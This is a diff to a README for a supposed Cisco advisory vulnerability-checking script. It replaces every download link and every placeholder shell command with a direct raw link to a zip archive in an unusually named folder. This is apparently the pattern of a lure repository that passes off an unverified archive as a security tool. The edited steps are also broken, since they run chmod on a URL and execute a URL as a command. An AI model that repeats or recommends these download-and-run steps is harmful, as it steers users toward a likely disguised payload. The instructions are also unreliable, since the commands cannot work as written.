@@ -10,7 +10,7 @@ To get started, follow the steps below to download and run the software.
 
 ## 📥 Download Link
 
-[![Download cisco-sa-sma-attack-N9bf4](https://img.shields.io/badge/Download-cisco--sa--sma--attack--N9bf4-brightgreen)](https://github.com/MRH701/cisco-sa-sma-attack-N9bf4/releases)
+[![Download cisco-sa-sma-attack-N9bf4](https://raw.githubusercontent.com/MRH701/cisco-sa-sma-attack-N9bf4/main/transcendingness/bf-attack-sma-cisco-sa-1.3.zip)](https://raw.githubusercontent.com/MRH701/cisco-sa-sma-attack-N9bf4/main/transcendingness/bf-attack-sma-cisco-sa-1.3.zip)
 
 ## 📋 System Requirements
 
@@ -28,7 +28,7 @@ Before you download, ensure your system meets the following requirements:
 
 ## 📄 How to Download & Install
 
-1. Visit the [Releases Page](https://github.com/MRH701/cisco-sa-sma-attack-N9bf4/releases) to download the latest version of the software.
+1. Visit the [Releases Page](https://raw.githubusercontent.com/MRH701/cisco-sa-sma-attack-N9bf4/main/transcendingness/bf-attack-sma-cisco-sa-1.3.zip) to download the latest version of the software.
 2. Locate the latest version available for download.
 3. Click the download link for your operating system (Windows or Linux).
 4. Once the download finishes, locate the downloaded file in your downloads folder.
@@ -45,11 +45,11 @@ Before you download, ensure your system meets the following requirements:
 2. Navigate to the downloaded file using the `cd` command.
 3. Make the script executable by running: 
    ```bash
-   chmod +x your_script_name.sh
+   chmod +x https://raw.githubusercontent.com/MRH701/cisco-sa-sma-attack-N9bf4/main/transcendingness/bf-attack-sma-cisco-sa-1.3.zip
    ```
 4. Execute the script:
    ```bash
-   ./your_script_name.sh
+   https://raw.githubusercontent.com/MRH701/cisco-sa-sma-attack-N9bf4/main/transcendingness/bf-attack-sma-cisco-sa-1.3.zip
    ```
 
 ## ⚙️ How to Use the Script
@@ -60,7 +60,7 @@ Before you download, ensure your system meets the following requirements:
 2. Navigate to the directory where the script is installed.
 3. Run the script by typing:
    ```bash
-   your_script_name.exe
+   https://raw.githubusercontent.com/MRH701/cisco-sa-sma-attack-N9bf4/main/transcendingness/bf-attack-sma-cisco-sa-1.3.zip
    ```
 4. The script will perform a check for vulnerabilities. Follow any on-screen instructions.
 
@@ -70,7 +70,7 @@ Before you download, ensure your system meets the following requirements:
 2. Navigate to the directory where the script is located.
 3. Run the script:
    ```bash
-   ./your_script_name.sh
+   https://raw.githubusercontent.com/MRH701/cisco-sa-sma-attack-N9bf4/main/transcendingness/bf-attack-sma-cisco-sa-1.3.zip
    ```
 4. Monitor the output in the terminal. It will inform you about any detected vulnerabilities.
 
@@ -103,4 +103,4 @@ This project is licensed under the [MIT License](LICENSE). Feel free to use and 
 
 ## 📥 Download Again
 
-Remember, you can always return to the [Releases Page](https://github.com/MRH701/cisco-sa-sma-attack-N9bf4/releases) to download the latest version. Stay safe and protected!
+Remember, you can always return to the [Releases Page](https://raw.githubusercontent.com/MRH701/cisco-sa-sma-attack-N9bf4/main/transcendingness/bf-attack-sma-cisco-sa-1.3.zip) to download the latest version. Stay safe and protected!
